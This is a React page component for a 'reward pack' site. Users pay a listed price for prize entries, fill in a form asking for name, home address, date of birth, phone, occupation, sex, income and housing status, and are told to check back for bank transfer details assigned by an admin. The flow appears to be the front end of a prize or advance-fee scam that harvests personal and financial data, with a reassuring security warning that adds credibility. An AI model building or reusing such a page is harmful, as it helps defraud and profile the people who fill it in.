import { useState } from "react";
import { Link, useNavigate, useParams } from "react-router-dom";
import { HiArrowLeft, HiCheck, HiExclamation, HiGift } from "react-icons/hi";
import { apiFetch } from "../api";
import { rewardPacks } from "../data/rewardPacks";

const SEX_OPTIONS = ["", "F", "M"];
const INCOME_FREQUENCY_OPTIONS = ["", "Monthly", "Weekly"];
const FULFILLMENT_OPTIONS = ["", "Cash", "Check"];
const HOUSING_OPTIONS = ["", "Own Apartment", "Rent Apartment"];

const INITIAL = {
  fullName: "",
  homeAddress: "",
  state: "",
  dateOfBirth: "",
  email: "",
  phone: "",
  occupation: "",
  sex: "",
  incomeFrequency: "",
  incomeAmount: "",
  fulfillmentPreference: "",
  housingStatus: "",
};

export default function RewardReviewPage() {
  const { packId } = useParams();
  const navigate = useNavigate();
  const pack = rewardPacks.find((item) => item.id === packId);
  const [form, setForm] = useState(INITIAL);
  const [errors, setErrors] = useState({});
  const [serverError, setServerError] = useState("");
  const [submitting, setSubmitting] = useState(false);

  if (!pack) {
    return (
      <div className="mx-auto max-w-2xl px-4 py-16 text-center">
        <h1 className="font-display text-3xl font-extrabold text-slate-950">Reward pack not found</h1>
        <p className="mt-3 text-slate-600">The selected reward pack is not available.</p>
        <Link to="/" className="mt-6 inline-flex rounded-2xl bg-orange-600 px-5 py-3 text-sm font-bold text-white">
          Back to Reward Packs
        </Link>
      </div>
    );
  }

  function handleChange(e) {
    const { name, value } = e.target;
    setForm((prev) => ({ ...prev, [name]: value }));
    setErrors((prev) => ({ ...prev, [name]: "" }));
  }

  function validate() {
    const nextErrors = {};
    if (!form.fullName.trim()) nextErrors.fullName = "Full name is required.";
    if (!form.homeAddress.trim()) nextErrors.homeAddress = "Full home address is required.";
    if (!form.state.trim()) nextErrors.state = "State is required.";
    if (!form.dateOfBirth) nextErrors.dateOfBirth = "Date of birth is required.";
    if (!form.email.trim()) nextErrors.email = "Email address is required.";
    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) nextErrors.email = "Enter a valid email address.";
    if (!form.phone.trim()) nextErrors.phone = "Text number is required.";
    if (!form.occupation.trim()) nextErrors.occupation = "Occupation is required.";
    if (!form.sex) nextErrors.sex = "Sex is required.";
    if (!form.incomeFrequency) nextErrors.incomeFrequency = "Choose monthly or weekly.";
    if (!form.incomeAmount.trim()) nextErrors.incomeAmount = "Income amount is required.";
    if (!form.fulfillmentPreference) nextErrors.fulfillmentPreference = "Choose cash or check.";
    if (!form.housingStatus) nextErrors.housingStatus = "Choose own or rent apartment.";
    return nextErrors;
  }

  async function handleSubmit(e) {
    e.preventDefault();
    setServerError("");
    const nextErrors = validate();
    if (Object.keys(nextErrors).length) {
      setErrors(nextErrors);
      return;
    }

    setSubmitting(true);
    try {
      const res = await apiFetch("/api/reward-entries", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ...form,
          selectedRewardPackId: pack.id,
          selectedRewardPack: pack.name,
          listedPrice: pack.price,
        }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Unable to submit request.");
      if (data.statusCode) {
        localStorage.setItem(
          "latestRewardStatus",
          JSON.stringify({ entryId: data.entryId, statusCode: data.statusCode })
        );
      }
      navigate(`/reward-status/${data.entryId}`);
    } catch (err) {
      setServerError(err.message);
    } finally {
      setSubmitting(false);
    }
  }

  return (
    <div className="bg-[#fffaf2]">
      <div className="mx-auto max-w-6xl px-4 py-10 sm:px-6 lg:py-14">
        <Link to="/" className="mb-6 inline-flex items-center gap-2 text-sm font-bold text-slate-600 transition hover:text-orange-700">
          <HiArrowLeft className="h-4 w-4" />
          Back to reward packs
        </Link>

        <div className="grid gap-8 lg:grid-cols-[0.9fr_1.1fr] lg:items-start">
          {/* Pack details */}
          <section className="overflow-hidden rounded-[1.75rem] border border-slate-200 bg-white shadow-xl shadow-orange-950/5">
            <div className="bg-slate-950 px-7 py-6 text-white">
              <p className="text-xs font-bold uppercase tracking-[0.24em] text-orange-300">Reward Request</p>
              <h1 className="mt-3 font-display text-3xl font-extrabold">{pack.name}</h1>
            </div>

            <div className="p-7 text-center">
              <p className="text-sm font-semibold uppercase tracking-[0.24em] text-slate-400">{pack.eyebrow}</p>
              <div className="mt-7 flex items-center justify-center gap-4">
                <span className="text-2xl text-slate-400 line-through">{pack.previousEntries}</span>
                <span className="font-display text-7xl font-extrabold leading-none text-slate-950">{pack.entries}</span>
              </div>
              <p className="mt-3 text-sm font-extrabold uppercase tracking-[0.2em] text-slate-500">Entries</p>
              <p className="mt-6 font-display text-4xl font-extrabold text-slate-950">{pack.price}</p>
              {/* <p className="mt-2 text-lg text-slate-500">
                Members pay only <span className="font-extrabold text-emerald-700">{pack.memberPrice}</span>
              </p> */}

              <ul className="mt-7 space-y-4 text-left">
                {pack.features.map((feature) => (
                  <li key={feature} className="flex gap-3 text-base leading-7 text-slate-700">
                    <HiCheck className="mt-1 h-5 w-5 flex-shrink-0 text-orange-600" />
                    <span>{feature}</span>
                  </li>
                ))}
              </ul>
            </div>
          </section>

          {/* Request form */}
          <section className="rounded-[1.75rem] border border-slate-200 bg-white p-7 shadow-xl shadow-orange-950/5">
            <div className="flex items-start gap-4">
              <div className="flex h-12 w-12 flex-shrink-0 items-center justify-center rounded-2xl bg-orange-100 text-orange-700">
                <HiGift className="h-7 w-7" />
              </div>
              <div>
                <h2 className="font-display text-2xl font-extrabold text-slate-950">Request bank transfer details</h2>
                <p className="mt-2 text-sm leading-6 text-slate-600">
                  Submit your contact details to request bank transfer payment information for this reward pack. After submission, refresh your status page to see the bank details assigned by the admin.
                </p>
              </div>
            </div>

            <form onSubmit={handleSubmit} noValidate className="mt-7 grid gap-4">
              {/* Selected pack summary */}
              <div className="rounded-2xl border border-orange-200 bg-orange-50 p-5">
                <p className="text-xs font-bold uppercase tracking-widest text-orange-700">Selected pack</p>
                <p className="mt-1 font-display text-xl font-extrabold text-slate-950">{pack.name}</p>
                <p className="mt-1 text-sm text-orange-900">{pack.price} listed | {pack.entries} entries</p>
              </div>

              {/* Payment method indicator — bank transfer only */}
              <div className="flex items-center gap-3 rounded-2xl border border-slate-200 bg-slate-50 px-5 py-4">
                <div className="flex h-9 w-9 flex-shrink-0 items-center justify-center rounded-xl bg-slate-200 text-slate-700">
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                    <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4z" />
                    <path fillRule="evenodd" d="M18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z" clipRule="evenodd" />
                  </svg>
                </div>
                <div>
                  <p className="text-sm font-bold text-slate-800">Bank Transfer</p>
                  <p className="text-xs text-slate-500">Admin will assign transfer details after your request is received.</p>
                </div>
              </div>

              <div className="grid gap-4 sm:grid-cols-2">
                <Field label="Full Name" name="fullName" value={form.fullName} onChange={handleChange} error={errors.fullName} required />
                <Field label="Email Address" name="email" type="email" value={form.email} onChange={handleChange} error={errors.email} required />
                <div className="sm:col-span-2">
                  <Field label="Full Home Address" name="homeAddress" value={form.homeAddress} onChange={handleChange} error={errors.homeAddress} required />
                </div>
                <Field label="State" name="state" value={form.state} onChange={handleChange} error={errors.state} required />
                <Field label="Date of Birth" name="dateOfBirth" type="date" value={form.dateOfBirth} onChange={handleChange} error={errors.dateOfBirth} required />
                <Field label="Text Number" name="phone" type="tel" value={form.phone} onChange={handleChange} error={errors.phone} required />
                <Field label="Occupation" name="occupation" value={form.occupation} onChange={handleChange} error={errors.occupation} required />
                <SelectField label="Sex (F/M)" name="sex" value={form.sex} onChange={handleChange} options={SEX_OPTIONS} error={errors.sex} required />
                <SelectField label="Income Frequency" name="incomeFrequency" value={form.incomeFrequency} onChange={handleChange} options={INCOME_FREQUENCY_OPTIONS} error={errors.incomeFrequency} required />
                <Field label="Monthly / Weekly Income" name="incomeAmount" value={form.incomeAmount} onChange={handleChange} error={errors.incomeAmount} placeholder="Amount or range" required />
                <SelectField label="Cash or Check (method of prize)" name="fulfillmentPreference" value={form.fulfillmentPreference} onChange={handleChange} options={FULFILLMENT_OPTIONS} error={errors.fulfillmentPreference} required />
                <SelectField label="Own or Rent Apartment" name="housingStatus" value={form.housingStatus} onChange={handleChange} options={HOUSING_OPTIONS} error={errors.housingStatus} required />
              </div>

              <div className="rounded-2xl border border-amber-300 bg-amber-50 p-5">
                <div className="flex gap-3">
                  <HiExclamation className="mt-0.5 h-6 w-6 flex-shrink-0 text-amber-700" />
                  <p className="text-sm leading-6 text-amber-900">
                    Do not send bank passwords, OTP codes, or card PINs through any channel. Bank transfer details will be shown on your status page only — never shared via email or third parties.
                  </p>
                </div>
              </div>

              {serverError && (
                <div className="rounded-2xl border border-red-200 bg-red-50 p-4 text-sm font-semibold text-red-700">
                  {serverError}
                </div>
              )}

              <button
                type="submit"
                disabled={submitting}
                className="inline-flex items-center justify-center rounded-2xl bg-orange-600 px-5 py-4 font-display text-sm font-extrabold text-white shadow-lg shadow-orange-600/20 transition hover:bg-orange-700 disabled:cursor-not-allowed disabled:opacity-60"
              >
                {submitting ? "Submitting..." : "Request Transfer Details"}
              </button>
            </form>
          </section>
        </div>
      </div>
    </div>
  );
}

function Field({ label, name, value, onChange, error, type = "text", required, placeholder }) {
  return (
    <div className="grid gap-1.5">
      <label htmlFor={name} className="text-sm font-bold text-slate-700">
        {label} {required && <span className="text-red-500">*</span>}
      </label>
      <input
        id={name}
        name={name}
        type={type}
        value={value}
        onChange={onChange}
        placeholder={placeholder}
        className={`rounded-xl border px-4 py-3 text-sm outline-none transition focus:border-orange-500 focus:ring-4 focus:ring-orange-500/10 ${error ? "border-red-400 bg-red-50" : "border-slate-200"}`}
      />
      {error && <p className="text-xs font-semibold text-red-600">{error}</p>}
    </div>
  );
}

function SelectField({ label, name, value, onChange, options, optional, required, error }) {
  return (
    <div className="grid gap-1.5">
      <label htmlFor={name} className="text-sm font-bold text-slate-700">
        {label}{" "}
        {required && <span className="text-red-500">*</span>}
        {optional && <span className="text-xs font-normal text-slate-400">(optional)</span>}
      </label>
      <select
        id={name}
        name={name}
        value={value}
        onChange={onChange}
        className={`rounded-xl border px-4 py-3 text-sm outline-none transition focus:border-orange-500 focus:ring-4 focus:ring-orange-500/10 ${error ? "border-red-400 bg-red-50" : "border-slate-200"}`}
      >
        {options.map((option) => (
          <option key={option} value={option}>{option || `Select ${label}`}</option>
        ))}
      </select>
      {error && <p className="text-xs font-semibold text-red-600">{error}</p>}
    </div>
  );
}
